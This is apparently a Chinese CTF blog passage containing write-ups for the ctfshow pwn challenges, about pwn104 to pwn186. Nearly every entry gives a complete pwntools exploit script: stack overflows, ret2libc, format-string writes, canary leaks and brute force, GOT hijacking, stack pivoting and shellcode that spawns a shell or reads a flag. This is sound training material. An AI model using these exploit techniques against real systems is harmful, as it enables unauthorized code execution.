import*<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28156)<br><br>ret=0x040055e<br>backdoor=0x040078D<br><br>io.sendlineafter(b&quot;you?&quot;,b&quot;-1&quot;)<br>payload=cyclic(0xE+8)+p64(ret)+p64(backdoor)<br>io.sendline(payload)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn105"><a href="#pwn105" class="headerlink" title="pwn105"></a>pwn105</h2><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8105_1.png"></p><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8105_2.png"></p><p>该题的程序流程比较简单，先输入一串字符串，若该字符串的长度满足if语句，则退出程序，这里因为接收字符串长度的变量n3是一个无符号八位的整型，范围0~255，因此可以输入一串较长的字符串，使得n3的值在范围之间即可。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28106)<br><br>backdoor=0x804870E<br><br>payload=cyclic(0x11+4)+p32(backdoor)<br>payload=payload.ljust(256,b&#x27;a&#x27;)<br>io.sendline(payload)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn106"><a href="#pwn106" class="headerlink" title="pwn106"></a>pwn106</h2><p>和pwn105差不多一样</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28256)<br><br>flag=0x8048919<br><br>io.sendlineafter(b&quot;choice:&quot;,b&quot;1&quot;)<br>io.sendlineafter(b&quot;username:&quot;,b&quot;haoo&quot;)<br><br>payload=cyclic(0x14+4)+p32(flag)<br>payload=payload.ljust(260,b&quot;a&quot;)<br><br>io.sendlineafter(b&quot;passwd:&quot;,payload)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn107"><a href="#pwn107" class="headerlink" title="pwn107"></a>pwn107</h2><p>同理，一道简单的整数安全</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>from LibcSearcher import*<br>elf=ELF(&#x27;./pwn107&#x27;)<br>#libc=ELF(&#x27;./pwn107libc.so&#x27;)<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28277)<br><br>printf_got=elf.got[&#x27;printf&#x27;]<br>printf_plt=elf.plt[&#x27;printf&#x27;]<br>main=elf.sym[&#x27;main&#x27;]<br><br>io.sendlineafter(b&quot;read?&quot;,b&quot;-1&quot;)<br>payload=cyclic(0x2c+4)+p32(printf_plt)+p32(main)+p32(printf_got)<br>io.sendline(payload)<br><br>io.recvuntil(b&quot;\n&quot;)<br>printf=u32(io.recvuntil(&#x27;\xf7&#x27;)[-4:])<br>print(hex(printf))<br><br>libc=LibcSearcher(&#x27;printf&#x27;,printf)<br>libc_base=printf-libc.dump(&#x27;printf&#x27;)<br>bin_sh=libc_base+libc.dump(&#x27;str_bin_sh&#x27;)<br>system=libc_base+libc.dump(&#x27;system&#x27;)<br><br>io.sendlineafter(b&quot;read?&quot;,b&quot;-1&quot;)<br>io.recvuntil(b&quot;\n&quot;)<br>payload=cyclic(0x2c+4)+p32(system)+p32(main)+p32(bin_sh)<br>io.sendline(payload)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn108"><a href="#pwn108" class="headerlink" title="pwn108"></a>pwn108</h2><p>限制了一些gadget，所以可以劫持strlen函数的got表为one_gadget即可。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import *<br>context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)<br>#io = process(&#x27;./pwn&#x27;)<br>io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28124)<br>elf = ELF(&#x27;./pwn108&#x27;)<br>libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)<br>io.recvuntil(&#x27;0x&#x27;)<br>puts_addr = int(io.recv(12),16)<br>libc_base = puts_addr - libc.sym[&#x27;puts&#x27;]<br>strlen = libc_base + 0x3eb0a8<br>sss = str(strlen)<br>io.sendline(sss)<br>one_gadget = libc_base + 0xe54fe<br>for _ in range(3):<br>    io.sendlineafter(&quot;biang!\n&quot;, chr(one_gadget &amp; 0xff))<br>    one_gadget = one_gadget &gt;&gt; 8<br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="pwn109"><a href="#pwn109" class="headerlink" title="pwn109"></a>pwn109</h2><p>存在格式化字符串漏洞，没开启NX保护，泄漏了栈地址，修改返回地址即可。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28184)<br>shellcode=asm(shellcraft.sh())<br><br>io.sendlineafter(&#x27;Quit!!!\n&#x27;,&#x27;1&#x27;)<br>stack = int(io.recvuntil(&#x27;\n&#x27;),16)<br>ret = stack + 0x41c<br>payload = fmtstr_payload(16,&#123;ret:stack&#125;)<br>io.sendline(payload)<br>io.sendlineafter(&#x27;Quit!!!\n&#x27;,&#x27;2&#x27;)<br>io.sendlineafter(&#x27;Quit!!!\n&#x27;,&#x27;1&#x27;)<br>io.sendline(shellcode)<br>io.sendlineafter(&#x27;Quit!!!\n&#x27;,&#x27;3&#x27;)<br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn110"><a href="#pwn110" class="headerlink" title="pwn110"></a>pwn110</h2><p>大致思路跟pwn109一样，输入-1绕过检查并造成栈溢出，接收泄漏的栈地址，没开启NX保护，修改返回地址。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import *<br>context.log_level=&#x27;debug&#x27;<br>#io = process(&quot;./pwn&quot;)<br>io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28287)<br>io.recv()<br>io.sendline(b&#x27;-1&#x27;)<br>buf = int(io.recv(8),16)<br>io.recv()<br>payload = asm(shellcraft.sh()).ljust(0x41b+0x4,b&#x27;A&#x27;) + p32(buf)<br>io.sendline(payload)<br>io.interactive()<br><br></code></pre></td></tr></table></figure><h1 id="Bypass安全机制"><a href="#Bypass安全机制" class="headerlink" title="Bypass安全机制"></a>Bypass安全机制</h1><h2 id="pwn111"><a href="#pwn111" class="headerlink" title="pwn111"></a>pwn111</h2><p>简单的64位栈溢出，存在后门函数。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>elf=ELF(&#x27;./pwn111&#x27;)<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28272)<br><br>write_plt=elf.plt[&#x27;write&#x27;]<br>write_got=elf.got[&#x27;write&#x27;]<br>main=elf.sym[&#x27;main&#x27;]<br>backdoor=0x0400697<br>rdi=0x04008d3<br>rsi_r15=0x04008d1<br>ret=0x040025c<br><br>payload=cyclic(0x80+8)+p64(backdoor)<br>io.sendline(payload)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn112"><a href="#pwn112" class="headerlink" title="pwn112"></a>pwn112</h2><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn112_1.png"></p><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn112_2.png"></p><p>一道简单的题目，只需要将n17的值覆盖为17即可。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28202)<br><br>payload=p32(17)*0xe<br>io.sendline(payload)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn113"><a href="#pwn113" class="headerlink" title="pwn113"></a>pwn113</h2><p>一开始看起来有点复杂，但是执行了一下程序大概了解了流程，就是输入一个有效文件路径，就会输出该路径下的所有文件以及权限，但是不可读取</p><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn113.png"></p><p>可以看出若输入一个无效路径就会开启沙盒保护，因此可以打orw，由于开启了NX保护，因此先泄漏libc，获得mprotect，最后打orw。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>#io=process(&#x27;./pwn113&#x27;)<br>context.arch=&#x27;amd64&#x27;<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28170)<br>elf=ELF(&#x27;./pwn113&#x27;)<br>libc=ELF(&#x27;./pwn113libc.so&#x27;)<br><br>puts_plt=elf.plt[&#x27;puts&#x27;]<br>puts_got=elf.got[&#x27;puts&#x27;]<br>main=elf.sym[&#x27;main&#x27;]<br>rdi=0x0401ba3<br><br>#gdb.attach(io)<br><br>payload=b&#x27;a&#x27;*0x418+p8(0x28)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)<br>io.sendline(payload)<br>puts=u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))<br>print(hex(puts))<br><br>libc_base=puts-libc.sym[&#x27;puts&#x27;]<br>rsi=libc_base+0x023e6a<br>rdx=libc_base+0x01b96<br>gets=libc_base+libc.sym[&#x27;gets&#x27;]<br>mprotect=libc_base+libc.sym[&#x27;mprotect&#x27;]<br><br>payload=b&#x27;a&#x27;*0x418+p8(0x28)<br>payload+=p64(rdi)+p64(elf.bss())+p64(gets)<br>payload+=p64(rdi)+p64(elf.bss()&amp;0xfffffffffffff000)+p64(rsi)+p64(0x1000)+p64(rdx)+p64(7)+p64(mprotect)<br>payload+=p64(elf.bss())<br><br>io.sendline(payload)<br><br>shellcode=shellcraft.open(&#x27;/flag&#x27;)+shellcraft.read(3,elf.bss(),0x100)+shellcraft.write(1,elf.bss(),0x100)<br>shellcode=asm(shellcode)<br><br>io.sendline(shellcode)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><p>这里偷了下懒，直接使用shellcraft编写shellcode，下面粘贴一下官方WP所给的shellcode：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">shellcode = asm(&#x27;&#x27;&#x27;<br>mov rax, 0x67616c662f2e<br>push rax    #将文件名&#x27;./flag&#x27;压入栈<br>mov rdi, rsp    #rdi=文件名指针（栈顶）<br>xor esi, esi    #esi=0（O_RDONLY模式）<br>mov eax, 2    #eax=2（sys_open系统调用号）<br>syscall<br><br>cmp eax, 0<br>jg next    #比较返回值（文件描述符），若大于0（成功）则跳转到next<br><br>push 1<br>mov edi, 1<br>mov rsi, rsp<br>mov edx, 4<br>mov eax, edi<br>syscall<br>jmp exit<br><br>next:<br>mov edi, eax<br>mov rsi, rsp<br>mov edx, 0x100<br>xor eax, eax<br>syscall    #read<br><br>mov edx, eax<br>mov edi, 1<br>mov rsi, rsp<br>mov eax, edi<br>syscall    #write<br><br>exit:<br>xor edi, edi<br>mov eax, 231    #sys_exit_group系统调用号<br>syscall<br>&#x27;&#x27;&#x27;)<br></code></pre></td></tr></table></figure><h2 id="pwn114"><a href="#pwn114" class="headerlink" title="pwn114"></a>pwn114</h2><p>简单的一道栈溢出题目。直接溢出就能获得flag。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28269)<br><br>io.sendline(&#x27;Yes&#x27;)<br>payload=cyclic(0x108)<br>io.sendline(payload)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn115"><a href="#pwn115" class="headerlink" title="pwn115"></a>pwn115</h2><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn115.png"></p><p>开启了canary保护且存在格式化字符串漏洞与后门函数，因此可以先泄漏canary的值，再栈溢出返回到后门函数。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28161)<br><br>backdoor=0x80485A6<br><br>io.sendline(b&#x27;%55$p&#x27;)<br>io.recvuntil(&#x27;0x&#x27;)<br>canary=int(io.recv(8),16)<br>print(hex(canary))<br>io.recv()<br><br>payload=p32(canary)*54+p32(backdoor)<br>io.sendline(payload)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn116"><a href="#pwn116" class="headerlink" title="pwn116"></a>pwn116</h2><p>同理pwn115</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28221)<br><br>backdoor=0x8048586<br><br>io.sendline(b&#x27;%15$p&#x27;)<br>io.recvuntil(&#x27;0x&#x27;)<br>canary=int(io.recv(8),16)<br>print(hex(canary))<br><br>payload=p32(canary)*12+p32(backdoor)<br>io.sendline(payload)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn117"><a href="#pwn117" class="headerlink" title="pwn117"></a>pwn117</h2><p>利用canary检测失败会调用stack_chk_fail函数，输出报错并输出文件名的特点，可以覆盖该文件名指针实现任意地址读，关键在于找argv[0]的地址计算偏移，这主要用于flag已经存在了。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28261)<br><br>flag=0x06020A0<br><br>payload=cyclic(504)+p64(flag)<br>io.sendline(payload)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn118"><a href="#pwn118" class="headerlink" title="pwn118"></a>pwn118</h2><p>此题为No RELRO，可以修改got表的内容，再加上已经给了后门函数以及开启了canary保护，存在格式化字符串漏洞，因此可以修改__stack_chk_fail函数的got表的地址为后门地址，那么在调用该函数时就相当于调用了后门函数。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>elf=ELF(&#x27;./pwn118&#x27;)<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28286)<br><br>get_flag=0x8048586<br>_stack_chk_fail_got=elf.got[&#x27;__stack_chk_fail&#x27;]<br><br>payload=fmtstr_payload(7,&#123;_stack_chk_fail_got:get_flag&#125;)<br>payload=payload.ljust(0x50,b&#x27;a&#x27;)<br>io.sendline(payload)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn119"><a href="#pwn119" class="headerlink" title="pwn119"></a>pwn119</h2><p>利用fork函数创建的子进程会拷贝父进程的内存，因此在这题中父进程的canary的值不会改变，因此尽管会多次创建子进程，但是其canary的值不变，因此可以这样泄漏canary的值后造成栈溢出返回到backdoor，获得shell。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import *<br>import time<br><br>io = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28252)<br>elf = ELF(&#x27;./pwn119&#x27;)<br>backdoor = elf.sym[&#x27;backdoor&#x27;]<br>canary = b&#x27;\x00&#x27;<br><br>for i in range(3):<br>    for j in range(0, 256):<br>        print(&quot;idx: &quot; + str(i) + &quot;: &quot; + str(j))<br>        payload = b&#x27;a&#x27; * (0x70 - 0xC) + canary + bytes([j])<br>        io.send(payload)<br>        time.sleep(0.3)<br>        text = io.recv()<br>        print(text)<br>        if b&quot;stack smashing detected&quot; not in text:<br>            canary += bytes([j])<br>            print(&quot;Canary: &quot; + str(canary))<br>            break<br><br>print(&#x27;Canary:&#x27; + hex(u32(canary)))<br>payload = b&#x27;a&#x27; * (0x70 - 0xc) + canary + b&#x27;a&#x27; * 0xc + p32(backdoor)<br>io.send(payload)<br>io.recv()<br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn120"><a href="#pwn120" class="headerlink" title="pwn120"></a>pwn120</h2><p>这道题介绍了另一个绕过canary保护的方法，当开启canary保护的情况下，在程序创建线程时会创建一个TLS，这个TLS会存储canary的值，在函数返回前会使用该值进行对比，因此当溢出足够大时就能同时覆盖栈上的与TLS存储的canary的值，从而实现绕过。由于这题我们并没有泄漏出canary的值，就不好打常规的栈溢出之类的，因此可以打栈迁移+one_gadget。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28121)<br>elf=ELF(&#x27;./pwn120&#x27;)<br>libc=ELF(&#x27;./pwn120libc.so&#x27;)<br><br>rdi=0x0400be3<br>rsi_r15=0x0400be1<br>leave_ret=0x040098c<br><br>puts_plt=elf.plt[&#x27;puts&#x27;]<br>puts_got=elf.got[&#x27;puts&#x27;]<br>read=elf.sym[&#x27;read&#x27;]<br>bss=0x602f00<br><br><br>payload=b&#x27;a&#x27;*0x510+p64(bss-0x8)+p64(rdi)+p64(puts_got)+p64(puts_plt)<br>payload+=p64(rdi)+p64(0)+p64(rsi_r15)+p64(bss)+p64(0)+p64(read)<br>payload+=p64(leave_ret)<br>payload=payload.ljust(0x1000,b&#x27;a&#x27;)<br><br>io.sendlineafter(b&quot;How much do you want to send this time?&quot;,str(0x1000))<br>io.send(payload)<br><br>puts=u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))<br>print(hex(puts))<br>libc_base=puts-libc.sym[&#x27;puts&#x27;]<br>one_gadget=libc_base+0x4f302<br><br>payload=p64(one_gadget)<br>io.sendline(payload)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn121"><a href="#pwn121" class="headerlink" title="pwn121"></a>pwn121</h2><h2 id="pwn122"><a href="#pwn122" class="headerlink" title="pwn122"></a>pwn122</h2><h2 id="pwn123"><a href="#pwn123" class="headerlink" title="pwn123"></a>pwn123</h2><p>该题只对数组进行了初始化，但没有进行对数组边界的检查，因此可以修改返回地址到backdoor。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28235)<br>backdoor=0x80485D6<br>io.sendlineafter(b&#x27;name?&#x27;,b&#x27;haoo&#x27;)<br>io.recvuntil(b&#x27;numbers&#x27;)<br>io.recvuntil(b&#x27;&gt;&#x27;)<br>io.sendline(b&#x27;1&#x27;)<br>io.sendlineafter(b&#x27;edit: &#x27;,b&#x27;14&#x27;)<br>io.sendlineafter(b&#x27;How many? &#x27;,str(backdoor))<br><br>io.sendline(b&#x27;0&#x27;)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn124"><a href="#pwn124" class="headerlink" title="pwn124"></a>pwn124</h2><p>简单的打shellcode</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28251)<br>io.sendline(b&#x27;CTFshowPWN&#x27;)<br>shellcode=asm(shellcraft.sh())<br>io.sendline(shellcode)<br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn125"><a href="#pwn125" class="headerlink" title="pwn125"></a>pwn125</h2><p><img src="/images/ctfshow_pwn%E5%85%A5%E9%97%A8_pwn125.png"></p><p>不难就是多了个mov rdi,rsp这说明了此时rdi指向了输入的数据在内存的第一个位置。存在system函数，直接输入&#x2F;bin&#x2F;sh即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28133)<br>system=0x0400672<br>payload=b&#x27;/bin/sh\x00&#x27;+cyclic(0x2000)+p64(system)<br>io.sendline(payload)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn126"><a href="#pwn126" class="headerlink" title="pwn126"></a>pwn126</h2><p>可以直接打ret2libc</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>elf=ELF(&#x27;./pwn126&#x27;)<br>libc=ELF(&#x27;./pwn126libc.so&#x27;)<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28235)<br><br>rdi=0x04007a3<br>ret=0x04004c6<br>puts_plt=elf.plt[&#x27;puts&#x27;]<br>puts_got=elf.got[&#x27;puts&#x27;]<br>main=elf.sym[&#x27;main&#x27;]<br><br>payload=cyclic(0x40+8)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)<br>io.sendline(payload)<br>puts=u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))<br>print(hex(puts))<br><br>libc_base=puts-libc.sym[&#x27;puts&#x27;]<br>system=libc_base+libc.sym[&#x27;system&#x27;]<br>bin_sh=libc_base+next(libc.search(&#x27;/bin/sh\x00&#x27;))<br><br>payload=cyclic(0x40+8)+p64(ret)+p64(rdi)+p64(bin_sh)+p64(system)+p64(main)<br>io.sendline(payload)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn127"><a href="#pwn127" class="headerlink" title="pwn127"></a>pwn127</h2><p>同样打ret2libc</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>elf=ELF(&#x27;./pwn127&#x27;)<br>libc=ELF(&#x27;./pwn127libc.so&#x27;)<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28272)<br><br>rdi=0x0400803<br>rsi_r15=0x0400801<br>ret=0x04004fe<br>write_plt=elf.plt[&#x27;write&#x27;]<br>write_got=elf.got[&#x27;write&#x27;]<br>main=elf.sym[&#x27;main&#x27;]<br><br>payload=cyclic(0x80+8)+p64(rdi)+p64(1)+p64(rsi_r15)+p64(write_got)+p64(0)+p64(write_plt)+p64(main)<br>io.sendline(payload)<br>write=u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))<br>print(hex(write))<br><br>libc_base=write-libc.sym[&#x27;write&#x27;]<br>system=libc_base+libc.sym[&#x27;system&#x27;]<br>bin_sh=libc_base+next(libc.search(&#x27;/bin/sh\x00&#x27;))<br><br>payload=cyclic(0x80+8)+p64(rdi)+p64(bin_sh)+p64(system)+p64(main)<br>io.sendline(payload)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn128"><a href="#pwn128" class="headerlink" title="pwn128"></a>pwn128</h2><h2 id="pwn129"><a href="#pwn129" class="headerlink" title="pwn129"></a>pwn129</h2><h2 id="pwn130"><a href="#pwn130" class="headerlink" title="pwn130"></a>pwn130</h2><h2 id="pwn131"><a href="#pwn131" class="headerlink" title="pwn131"></a>pwn131</h2><p>32位开启了PIE保护，程序中输出了main函数的地址，就可以算出基地址，这次不一样的点在于最后恢复了ebx寄存器，因此在溢出时需要覆盖上去。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>elf=ELF(&#x27;./pwn131&#x27;)<br>libc=ELF(&#x27;./pwn131libc.so&#x27;)<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28238)<br>io.recvuntil(&#x27;main addr is here :&#x27;)<br>io.recvuntil(&#x27;0x&#x27;)<br>main=int(io.recv(8),16)<br>print(hex(main))<br><br>addr_base=main-0x79a<br>ebx=addr_base+0x2fc0<br>write_plt=addr_base+elf.plt[&#x27;write&#x27;]<br>write_got=addr_base+elf.got[&#x27;write&#x27;]<br><br>payload=cyclic(132)+p32(ebx)+p32(0)+p32(write_plt)+p32(main)+p32(1)+p32(write_got)+p32(4)<br>io.sendline(payload)<br>write=u32(io.recvuntil(&#x27;\xf7&#x27;)[-4:])<br>print(hex(write))<br><br>libc_base=write-libc.sym[&#x27;write&#x27;]<br>system=libc_base+libc.sym[&#x27;system&#x27;]<br>bin_sh=libc_base+next(libc.search(&#x27;/bin/sh\x00&#x27;))<br><br>payload=cyclic(0x88+4)+p32(system)+p32(0)+p32(bin_sh)<br>io.sendline(payload)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn132"><a href="#pwn132" class="headerlink" title="pwn132"></a>pwn132</h2><p>很简单的逻辑，只需要输入CTFshow-daniu即可获得shell。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28274)<br><br>io.sendline(b&#x27;CTFshow-daniu&#x27;)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn133"><a href="#pwn133" class="headerlink" title="pwn133"></a>pwn133</h2><p>当然此题获得flag的方式也很简单，但是有些函数换成了安全函数且开启了FORTIFY保护，所以有些东西需要了解一下（这个后面再写一个博客）。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28143)<br><br>io.sendline(b&#x27;check&#x27;)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn134"><a href="#pwn134" class="headerlink" title="pwn134"></a>pwn134</h2><p>同样简单，只是程序的逻辑被搞得很复杂罢了。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28274)<br><br>io.sendline(b&#x27;Exit&#x27;)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h1 id="堆利用-前置基础"><a href="#堆利用-前置基础" class="headerlink" title="堆利用-前置基础"></a>堆利用-前置基础</h1><p>开启了堆的学习，难度就上去了，堆部分的ctfshow等后面学到有点感觉了后再来更新吧（0w0）。</p><h2 id="pwn135-140"><a href="#pwn135-140" class="headerlink" title="pwn135-140"></a>pwn135-140</h2><p>都给了flag，主要是介绍了一些基础知识</p><h2 id="pwn141"><a href="#pwn141" class="headerlink" title="pwn141"></a>pwn141</h2><h1 id="堆利用"><a href="#堆利用" class="headerlink" title="堆利用"></a>堆利用</h1><h1 id="中期测评"><a href="#中期测评" class="headerlink" title="中期测评"></a>中期测评</h1><h2 id="pwn181"><a href="#pwn181" class="headerlink" title="pwn181"></a>pwn181</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28313)<br><br>payload=cyclic(0x12+4)+p32(0x080485D6)<br>io.sendline(payload)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn182"><a href="#pwn182" class="headerlink" title="pwn182"></a>pwn182</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28180)<br>io.sendline(b&#x27;sh\x00&#x27;)<br>io.interactive()<br><br></code></pre></td></tr></table></figure><p>只能输入7个字节，因此输入sh就可以获得shell，但是好像不能正常输出，因此输入cat flag 1&gt;&amp;2输出flag。</p><h2 id="pwn183"><a href="#pwn183" class="headerlink" title="pwn183"></a>pwn183</h2><p>给出了puts的地址，可以直接打ret2libc</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>libc=ELF(&#x27;./pwn183libc.so&#x27;)<br>elf=ELF(&#x27;./pwn183&#x27;)<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28257)<br><br>io.recvuntil(b&#x27; Hint  : &#x27;)<br>puts=int(io.recv(14),16)<br>print(hex(puts))<br><br>rdi=0x0400873<br>ret=0x0400546<br>libc_base=puts-libc.sym[&#x27;puts&#x27;]<br>system=libc_base+libc.sym[&#x27;system&#x27;]<br>bin_sh=libc_base+next(libc.search(&#x27;/bin/sh\x00&#x27;))<br><br>payload=cyclic(0x60+8)+p64(ret)+p64(rdi)+p64(bin_sh)+p64(system)<br>io.sendline(payload)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn184"><a href="#pwn184" class="headerlink" title="pwn184"></a>pwn184</h2><p>开启了PIE保护，但是又后门函数，因为只有最后几位不同，直接覆盖修改即可。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28192)<br><br>payload=cyclic(0x1c+4)+b&#x27;\x35&#x27;<br>io.send(payload)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn185"><a href="#pwn185" class="headerlink" title="pwn185"></a>pwn185</h2><p>也可以打ret2libc，但是需要再输入一个换行符才能输出puts的地址，因此会多一个gets函数。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>elf=ELF(&#x27;./pwn185&#x27;)<br>libc=ELF(&#x27;./pwn185libc.so&#x27;)<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28128)<br><br>puts_plt=elf.plt[&#x27;puts&#x27;]<br>puts_got=elf.got[&#x27;puts&#x27;]<br>ebx=0x08048391<br>bss=0x0804B030<br>gets=elf.plt[&#x27;gets&#x27;]<br>ctfshow=elf.sym[&#x27;ctfshow&#x27;]<br><br>payload=cyclic(0x28+4)+p32(puts_plt)+p32(ebx)+p32(puts_got)<br>payload+=p32(gets)+p32(ebx)+p32(bss)<br>payload+=p32(ctfshow)<br><br>io.sendline(payload)<br>io.sendline(b&#x27;1&#x27;)<br><br>puts=u32(io.recvuntil(&#x27;\xf7&#x27;)[-4:])<br>print(hex(puts))<br><br>libc_base=puts-libc.sym[&#x27;puts&#x27;]<br>system=libc_base+libc.sym[&#x27;system&#x27;]<br>bin_sh=libc_base+next(libc.search(&#x27;/bin/sh\x00&#x27;))<br><br>payload=cyclic(0x28+4)+p32(system)+p32(ctfshow)+p32(bin_sh)<br>io.sendline(payload)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="pwn186"><a href="#pwn186" class="headerlink" title="pwn186"></a>pwn186</h2><p>直接打shellcode，输入的shellcode执行了ctfshow函数，倒序了，因此再倒序回来即可。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs 